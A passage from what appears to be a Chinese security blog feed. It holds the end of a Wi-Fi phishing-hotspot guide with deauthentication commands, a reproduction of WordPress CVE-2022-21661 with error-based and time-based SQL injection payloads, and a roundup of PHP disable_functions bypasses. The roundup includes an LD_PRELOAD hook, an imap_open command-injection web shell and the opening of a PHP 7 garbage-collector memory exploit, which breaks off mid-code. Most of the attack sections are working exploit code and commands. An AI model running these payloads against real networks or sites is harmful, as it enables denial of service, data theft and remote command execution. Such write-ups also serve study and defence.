alt="image-20210420125329771"></p><p>此时所有https流量均转发至本地443端口</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo <span class="hljs-keyword">python3</span> setup.<span class="hljs-keyword">py</span> install<br></code></pre></td></tr></table></figure><p>再次访问就无法打开https页面</p><h3 id="执行Wifi取消身份验证攻击"><a href="#执行Wifi取消身份验证攻击" class="headerlink" title="执行Wifi取消身份验证攻击"></a>执行Wifi取消身份验证攻击</h3><p><strong>为了能让大部分设备连接我们的钓鱼热点，我们需要通过取消身份验证攻击令连接真实热点的设备掉线</strong></p><blockquote><p><strong>什么是wifi取消身份验证攻击？</strong></p></blockquote><blockquote><p>wifi取消身份验证攻击是一种拒绝服务攻击，它以用户和wifi接入点之间的通信为目标。</p><p>攻击者可以随时将带有身份验证对象欺骗地址的取消身份验证帧发送到无线访问点，令对象掉线。</p></blockquote><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">wp3 &gt; use wifi.wifideauth<br>wp3 : wifideauth &gt; <span class="hljs-keyword">set</span> <span class="hljs-keyword">interface</span> <span class="hljs-symbol">wlan0</span><br><span class="hljs-symbol">wp3</span> : <span class="hljs-symbol">wifideauth</span> &gt; <span class="hljs-symbol">scan</span><br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/10/26/55RVn1.png" alt="image-20210420132318136"></p><p>将信道切换为10</p><p><img src="https://z3.ax1x.com/2021/10/26/55Re76.png" alt="image-20210420132823577"></p><p>选择一个bssid</p><p><img src="https://z3.ax1x.com/2021/10/26/55RZ0x.png" alt="image-20210420132646021"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">wp3 &gt; use wifi.wifideauth<br>wp3 : wifideauth &gt; <span class="hljs-keyword">set</span> <span class="hljs-keyword">interface</span> <span class="hljs-symbol">wlan0</span><br><span class="hljs-symbol">wp3</span> : <span class="hljs-symbol">wifideauth</span> &gt; <span class="hljs-symbol">set</span> <span class="hljs-symbol">target</span> <span class="hljs-symbol">xx</span>:<span class="hljs-symbol">xx</span>:<span class="hljs-symbol">e2</span>:<span class="hljs-symbol">e8</span>:<span class="hljs-symbol">e4</span><br></code></pre></td></tr></table></figure><p><code>start</code></p><p>运行后，目标wifi即无法连接</p><p>如果想将身份验证攻击与钓鱼热点结合使用，则需要准备俩网卡</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Word Press核心框架WP_Query SQL注入漏洞</title>
    <link href="/2022/04/28/CVE-2022%E2%80%9321661/"/>
    <url>/2022/04/28/CVE-2022%E2%80%9321661/</url>
    
    <content type="html"><![CDATA[<h1 id="Word-Press核心框架WP-Query-SQL注入漏洞"><a href="#Word-Press核心框架WP-Query-SQL注入漏洞" class="headerlink" title="Word Press核心框架WP_Query SQL注入漏洞"></a>Word Press核心框架WP_Query SQL注入漏洞</h1><h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><blockquote><p>Wordpress它是世界上 最常用的开源CMS之一，在允许开发者自己构建插件和主题来管理网站的时候，由于它的便利性而被大量使用<span id="more"></span>，wordpress的核心会提供插件&#x2F;主题的功能来调用和使用wordpress提供的数据格式、查询<a href="https://cloud.tencent.com/solution/database?from=10680">数据库</a>等功能。2022年1月6日，wordpress发布了5.8.3版本，修复了一处核心代码WP_Query的sql注入漏洞。Wordpress的核心部分发现了一个SQL Injection漏洞，最近Wordpress也发布了针对这个错误的补丁。WP_Query是wordpress定义的一个类，允许开发者编写自定义查询和使用不同的参数展示文章，并可以直接查询wordpress数据库，在核心框架和插件以及主题中广泛使用。      </p></blockquote><h2 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a>0x01 影响范围</h2><p>WordPress v4.1~v5.8.2</p><h2 id="0x02-漏洞重现"><a href="#0x02-漏洞重现" class="headerlink" title="0x02 漏洞重现"></a>0x02 漏洞重现</h2><p>测试环境：CentOS 7 + 宝塔(PHP 7.0 + a Nginx 1.21.0 )+ WordPress 5.8.2 + Chrome+Hackbar<br>增加代码在以下路径 <strong>\wp-content\themes\twentytwentyone\functions.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//cve-2022-21661 test</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">wp_query_test</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;test-cve-2022-21661&#x27;</span>;<br><br>    <span class="hljs-variable">$inputData</span> = <span class="hljs-title function_ invoke__">stripslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br>    <span class="hljs-variable">$jsonDecodeInputData</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$inputData</span>,<span class="hljs-literal">true</span>);<br>    <span class="hljs-variable">$wpTest</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WP_Query</span>(<span class="hljs-variable">$jsonDecodeInputData</span>);<br>    <span class="hljs-title function_ invoke__">wp_die</span>();<br>&#125;<br><br><span class="hljs-title function_ invoke__">add_action</span>(<span class="hljs-string">&#x27;wp_ajax_nopriv_test&#x27;</span>,<span class="hljs-string">&#x27;wp_query_test&#x27;</span>,<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h4 id="开启Debug"><a href="#开启Debug" class="headerlink" title="开启Debug"></a>开启Debug</h4><p>修改<strong>\wp-config.php</strong></p><p>注释:</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment">#define(&#x27;WP_DEBUG&#x27;, false);</span><br></code></pre></td></tr></table></figure><p>添加：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;log_errors&#x27;</span>,<span class="hljs-string">&#x27;On&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>,<span class="hljs-string">&#x27;On&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;error_reporting&#x27;</span>, E_ALL );<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;WP_DEBUG&#x27;</span>, <span class="hljs-literal">true</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;WP_DEBUG_LOG&#x27;</span>, <span class="hljs-literal">true</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;WP_DEBUG_DISPLAY&#x27;</span>, <span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><p>请求URL <strong><a href="http://10.1.1.6/wp-admin/admin-ajax.php">http://10.1.1.6/wp-admin/admin-ajax.php</a></strong></p><p>Body:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">action=test&amp;data=&#123;<span class="hljs-string">&quot;tax_query&quot;</span>:&#123;<span class="hljs-string">&quot;0&quot;</span>:&#123;<span class="hljs-string">&quot;field&quot;</span>:<span class="hljs-string">&quot;term_taxonomy_id&quot;</span>,<span class="hljs-string">&quot;terms&quot;</span>:[<span class="hljs-string">&quot;111) and extractvalue(rand(),concat(0x5e,user(),0x5e))#&quot;</span>]&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/image-20220217214019289.png" alt="image-20220217214019289"></p><p>报错语句:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> SQL_CALC_FOUND_ROWS wp_posts.ID <span class="hljs-keyword">FROM</span> wp_posts <span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> wp_term_relationships <span class="hljs-keyword">ON</span> (wp_posts.ID <span class="hljs-operator">=</span> wp_term_relationships.object_id) <span class="hljs-keyword">WHERE</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> ( wp_term_relationships.term_taxonomy_id <span class="hljs-keyword">IN</span> (<span class="hljs-number">111</span>) <span class="hljs-keyword">and</span> extractvalue(rand(),concat(<span class="hljs-number">0x5e</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">0x5e</span>))#) ) <span class="hljs-keyword">AND</span> wp_posts.post_type <span class="hljs-keyword">IN</span> (<span class="hljs-string">&#x27;post&#x27;</span>, <span class="hljs-string">&#x27;page&#x27;</span>, <span class="hljs-string">&#x27;attachment&#x27;</span>) <span class="hljs-keyword">AND</span> (wp_posts.post_status <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;publish&#x27;</span> <span class="hljs-keyword">OR</span> wp_posts.post_status <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;future&#x27;</span> <span class="hljs-keyword">OR</span> wp_posts.post_status <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;draft&#x27;</span> <span class="hljs-keyword">OR</span> wp_posts.post_status <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;pending&#x27;</span>) <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> wp_posts.ID <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> wp_posts.post_date <span class="hljs-keyword">DESC</span> LIMIT <span class="hljs-number">0</span>, <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><h4 id="未开启Debug"><a href="#未开启Debug" class="headerlink" title="未开启Debug"></a>未开启Debug</h4><p>可以使用的延时sqli的poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">action=test&amp;data=&#123;<span class="hljs-string">&quot;tax_query&quot;</span>:&#123;<span class="hljs-string">&quot;0&quot;</span>:&#123;<span class="hljs-string">&quot;field&quot;</span>:<span class="hljs-string">&quot;term_taxonomy_id&quot;</span>,<span class="hljs-string">&quot;terms&quot;</span>:[<span class="hljs-string">&quot;111) or (select sleep(2))#&quot;</span>]&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="0x03-参考资料"><a href="#0x03-参考资料" class="headerlink" title="0x03 参考资料"></a>0x03 参考资料</h2><p><a href="https://xz.aliyun.com/t/10841#toc-7">https://xz.aliyun.com/t/10841#toc-7</a></p><p><a href="https://blog.csdn.net/qq_46717339/article/details/122431779">https://blog.csdn.net/qq_46717339/article/details/122431779</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>绕过PHP Disable_Funciton</title>
    <link href="/2022/04/28/%E7%BB%95%E8%BF%87disable_function%E6%B1%87%E6%80%BB/"/>
    <url>/2022/04/28/%E7%BB%95%E8%BF%87disable_function%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="绕过disable-function汇总"><a href="#绕过disable-function汇总" class="headerlink" title="绕过disable_function汇总"></a>绕过disable_function汇总</h1><blockquote><p>总结几种方法绕过PHP种Disable_Function的方法</p><span id="more"></span></blockquote><h2 id="第一种方式—利用LD-PRELOAD"><a href="#第一种方式—利用LD-PRELOAD" class="headerlink" title="第一种方式—利用LD_PRELOAD"></a>第一种方式—利用LD_PRELOAD</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;LD_PRELOAD=/tmp/hack.so&quot;</span>);<br><span class="hljs-title function_ invoke__">mail</span>(<span class="hljs-string">&quot;a@localhost&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">//error_log(&quot;a&quot;,1);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">payload</span><span class="hljs-params">()</span> &#123;<br>    system(<span class="hljs-string">&quot;rm /tmp/check.txt&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">geteuid</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125;<br>unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>payload();<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">$ gcc -c -fPIC hack.c -o hack</span><br><span class="hljs-comment">$ gcc -shared hack -o hack.so</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="第二种模式—-imap-open"><a href="#第二种模式—-imap-open" class="headerlink" title="第二种模式— -imap_open"></a>第二种模式— -imap_open</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment"># https://antichat.com/threads/463395/#post-4254681</span><br><span class="hljs-comment"># # echo &#x27;1234567890&#x27;&gt;/tmp/test0001</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;imap_open&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no imap_open function!&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$server</span> = <span class="hljs-string">&quot;x -oProxyCommand=echo\t&quot;</span> . <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>] . <span class="hljs-string">&quot;&gt;/tmp/cmd_result&quot;</span>) . <span class="hljs-string">&quot;|base64\t-d|sh&#125;&quot;</span>;<br><span class="hljs-title function_ invoke__">imap_open</span>(<span class="hljs-string">&#x27;&#123;&#x27;</span> . <span class="hljs-variable">$server</span> . <span class="hljs-string">&#x27;:143/imap&#125;INBOX&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>); <span class="hljs-comment">// or var_dump(&quot;\n\nError: &quot;.imap_last_error());</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/tmp/cmd_result&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="第三种模式—-exec"><a href="#第三种模式—-exec" class="headerlink" title="第三种模式— -exec"></a>第三种模式— -exec</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;ls&quot;</span>,<span class="hljs-variable">$file</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="第四种模式—-passthru"><a href="#第四种模式—-passthru" class="headerlink" title="第四种模式— -passthru"></a>第四种模式— -passthru</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-string">&quot;ls&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="第五种模式—-system"><a href="#第五种模式—-system" class="headerlink" title="第五种模式— -system()"></a>第五种模式— -system()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="第六种模式—–fpm"><a href="#第六种模式—–fpm" class="headerlink" title="第六种模式—–fpm"></a>第六种模式—–fpm</h2><p><a href="https://www.mi1k7ea.com/2019/08/03/%E4%BB%8E%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6%E7%9C%8B%E5%88%A9%E7%94%A8PHP-FPM%E7%BB%95%E8%BF%87disable-functions/">从蚁剑插件看利用PHP-FPM绕过disable_functions</a>  </p><p><a href="https://evoa.me/index.php/archives/52/">PHP 连接方式&amp;攻击PHP-FPM&amp;*CTF echohub WP</a>  </p><h2 id="第七种模式–PHP-7-0-lt-7-3-Unix-‘gc’-Disable-Functions-Bypass"><a href="#第七种模式–PHP-7-0-lt-7-3-Unix-‘gc’-Disable-Functions-Bypass" class="headerlink" title="第七种模式–PHP 7.0 &lt; 7.3 (Unix) - ‘gc’ Disable Functions Bypass"></a>第七种模式–PHP 7.0 &lt; 7.3 (Unix) - ‘gc’ Disable Functions Bypass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Bug: https://bugs.php.net/bug.php?id=72530</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This exploit should work on all PHP 7.0-7.3 versions</span><br><span class="hljs-comment"># released as of 04/10/2019, specifically:</span><br><span class="hljs-comment"># </span><br><span class="hljs-comment"># PHP 7.0 - 7.0.33</span><br><span class="hljs-comment"># PHP 7.1 - 7.1.31</span><br><span class="hljs-comment"># PHP 7.2 - 7.2.23</span><br><span class="hljs-comment"># PHP 7.3 - 7.3.10</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Author: https://github.com/mm0r1</span><br><br><span class="hljs-title function_ invoke__">pwn</span>(<span class="hljs-string">&quot;ls&quot;</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$helper</span>-&gt;a);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span 